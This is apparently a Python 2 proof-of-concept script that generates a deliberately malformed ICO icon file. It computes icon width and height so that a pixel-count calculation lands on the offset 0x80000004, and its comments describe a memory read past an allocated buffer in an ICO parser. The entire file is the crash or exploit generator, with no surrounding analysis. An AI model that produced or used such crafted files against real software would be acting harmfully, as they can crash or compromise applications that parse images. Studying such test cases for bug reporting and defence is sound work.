import math, sys;

def BYTE(uValue):
  assert -1 < uValue < 0x100, "unk!?";
  return chr(uValue);
def WORD(uValue):
  return BYTE(uValue & 0xFF) + BYTE(uValue >> 8);
def DWORD(uValue):
  return WORD(uValue & 0xFFFF) + WORD(uValue >> 16);

LONG = INT = DWORD; # Close enough

def fsGenerateIconDir(
  uReserved = 0,
  uType = 1, # ICON
  uCount = 1
):
  return "".join([
    WORD(uReserved),
    WORD(uType),
    WORD(uCount),
  ]);

def fsGenerateIconDirEntry(
  uWidth = 0x41,
  uHeight = 0x41,
  uColorCount = 0, # image is truecolor
  uReserved = 0,
  uPlanes = 1, # color depth = 12
  uBitCount = 12,
  uBytesInRes = None,
  uImageOffset = None
):
  return "".join([
    BYTE(uWidth),
    BYTE(uHeight),
    BYTE(uColorCount),
    BYTE(uReserved),
    WORD(uPlanes),
    WORD(uBitCount),
    DWORD(uBytesInRes),
    DWORD(uImageOffset),
  ]);

def fsGenerateIconImage(sBitmapInfo, sXorMask, sAndMask):
  return "".join([sBitmapInfo, sXorMask, sAndMask]);

def fsGenerateBitmapInfo(sBitmapInfoHeader):
  return sBitmapInfoHeader;

def fsGenerateBitmapInfoHeader(
  uSize = None,                 # size of this header
  uWidth = None,                #
  uHeight = None,               # image is divided into 2, so value stored in ICO is double this value.
  uPlanes = 1,                  #
  uBitCount = 24,               # 8 bits per color
  uCompression = 0,             # data is not compressed
  uSizeImage = 0x41414141,      # not relevant
  uXPelsPerMeter = 0x42424242,  # not relevant
  uYPelsPerMeter = 0x43434343,  # not relevant
  uClrUsed = 0x0,               # Used in read as length of DWORD array at end of sBitmapInfoHeader + 4. This read
                                # appears to be a check to make sure memory is allocated in that area; the value read
                                # is the last BYTE of the DWORD array and the value is immediately discarded.
  uClrImportant = 0x44444444    # not relevant
):
  return "".join([
    DWORD(uSize),
    LONG(uWidth),
    LONG(uHeight * 2),
    WORD(uPlanes),
    WORD(uBitCount),
    DWORD(uCompression),
    DWORD(uSizeImage),
    INT(uXPelsPerMeter),
    INT(uYPelsPerMeter),
    DWORD(uClrUsed),
    DWORD(uClrImportant),
  ]);

def fsGenerateICO(sIconDir, sIconDirEntry, sIconImage):
  return "".join([sIconDir, sIconDirEntry, sIconImage]);

uIconImageOffset = 0x16;
uBitmapInfoHeaderSize = 0x28;
uXorMaskLength = 0x4;
uAndMaskLength = 0x4;
uOffset = 0x80000004;
uWxH = uOffset / 3; # Approximates address
assert uWxH * 3 == uOffset, "The offset 0x%X cannot be used because it is not divisible by 3." % uOffset;
for uHeight in xrange(long(math.sqrt(uWxH)), 1, -1):
  uWidth = uWxH / uHeight;
  if uWidth * uHeight == uWxH:
    break;
else:
  raise AssertionError("Cannot find a W x H pair that results in 0x%X" % uWxH);

sICO = fsGenerateICO(
  sIconDir = fsGenerateIconDir(),
  sIconDirEntry = fsGenerateIconDirEntry(
    uBytesInRes = uBitmapInfoHeaderSize + uXorMaskLength + uAndMaskLength,
    uImageOffset = uIconImageOffset,
  ),
  sIconImage = fsGenerateIconImage(
    sBitmapInfo = fsGenerateBitmapInfo(
      sBitmapInfoHeader = fsGenerateBitmapInfoHeader(
        uSize = uBitmapInfoHeaderSize,
        uWidth = uWidth,
        uHeight = uHeight,
      ),
    ),
    sXorMask = "X" * uXorMaskLength,
    sAndMask = "&" * uAndMaskLength,
  ),
);

open(sys.argv[1], "wb").write(sICO);